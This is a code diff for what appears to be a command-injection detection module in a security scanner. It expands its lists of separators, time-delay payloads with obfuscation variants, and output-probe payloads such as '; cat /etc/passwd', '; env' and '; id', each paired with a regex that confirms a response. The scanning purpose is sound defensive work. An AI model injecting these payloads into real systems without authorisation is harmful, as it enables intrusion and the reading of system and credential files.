@@ -17,21 +17,58 @@ from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
 from sentinelx.core.baseline import get_baseline, adaptive_delay
 
 
-SEPARATORS = [";", "|", "||", "&&", "`", "$()", "%0a", "%0d", "\n"]
+SEPARATORS = [";", "|", "||", "&&", "`", "$()", "%0a", "%0d", "\n", "${IFS}", "%09"]
 
 TIME_CMDS = [
-    # (template, ) — delay computed adaptively via adaptive_delay(); {d} = seconds
+    # --- TECHNIQUE: sleep chaining ---
     "; sleep {d}", "| sleep {d}", "&& sleep {d}",
     "; /bin/sleep {d}", "`sleep {d}`", "$(sleep {d})",
-    "; ping -c {d} 127.0.0.1", "; timeout {d}",
+    # --- TECHNIQUE: ping delay ---
+    "; ping -c {d} 127.0.0.1", "| ping -c {d} 127.0.0.1",
+    # --- TECHNIQUE: timeout ---
+    "; timeout {d}",
+    # --- TECHNIQUE: IFS obfuscation ---
+    ";sleep${IFS}{d}", "%0asleep${IFS}{d}",
+    # --- TECHNIQUE: language runtimes ---
+    "; php -r 'sleep({d});'",
+    "; python3 -c 'import time;time.sleep({d})'",
+    "; node -e 'setTimeout(()=>{}, {d}000)'",
+    "; perl -e 'sleep({d})'",
+    # --- TECHNIQUE: balanced quotes ---
+    "'; sleep {d}; '", '"; sleep {d}; "',
 ]
 OUTPUT_PAYLOADS = [
+    # --- TECHNIQUE: id via separators ---
     ("; id", re.compile(r"uid=\d+.*gid=\d+")),
     ("| id", re.compile(r"uid=\d+.*gid=\d+")),
     ("&& id", re.compile(r"uid=\d+.*gid=\d+")),
+    ("|| id", re.compile(r"uid=\d+.*gid=\d+")),
+    ("`id`", re.compile(r"uid=\d+.*gid=\d+")),
+    ("$(id)", re.compile(r"uid=\d+.*gid=\d+")),
+    ("%0aid", re.compile(r"uid=\d+.*gid=\d+")),
+    # --- TECHNIQUE: whoami ---
     ("; whoami", re.compile(r"(?m)^(root|www-data|apache|nginx|daemon|nobody)\s*$")),
+    ("| whoami", re.compile(r"(?m)^(root|www-data|apache|nginx|daemon|nobody)\s*$")),
+    # --- TECHNIQUE: uname ---
     ("; uname -a", re.compile(r"Linux .*GNU|Darwin ")),
+    ("&& uname -a", re.compile(r"Linux .*GNU|Darwin ")),
+    # --- TECHNIQUE: passwd read ---
     ("; cat /etc/passwd", re.compile(r"root:x:0:0:")),
+    ("| cat /etc/passwd", re.compile(r"root:x:0:0:")),
+    ("; cat${IFS}/etc/passwd", re.compile(r"root:x:0:0:")),
+    # --- TECHNIQUE: env ---
+    ("; env", re.compile(r"PATH=", re.I)),
+    # --- TECHNIQUE: arithmetic proof (language-agnostic) ---
+    ("; echo $((1337*2))", re.compile(r"2674")),
+    ("| echo $((1337*2))", re.compile(r"2674")),
+    ("; expr 1337 * 2", re.compile(r"2674")),
+    # --- TECHNIQUE: runtime echo ---
+    ("; php -r 'echo 1337*2;'", re.compile(r"2674")),
+    ("; python3 -c 'print(1337*2)'", re.compile(r"2674")),
+    ("; node -e 'console.log(1337*2)'", re.compile(r"2674")),
+    # --- TECHNIQUE: Windows ---
+    ("& whoami", re.compile(r"(?m)^[a-z0-9_\\\\-]+$", re.I)),
+    ("; ver", re.compile(r"Windows", re.I)),
 ]
 
 REMEDIATION_RCE = (
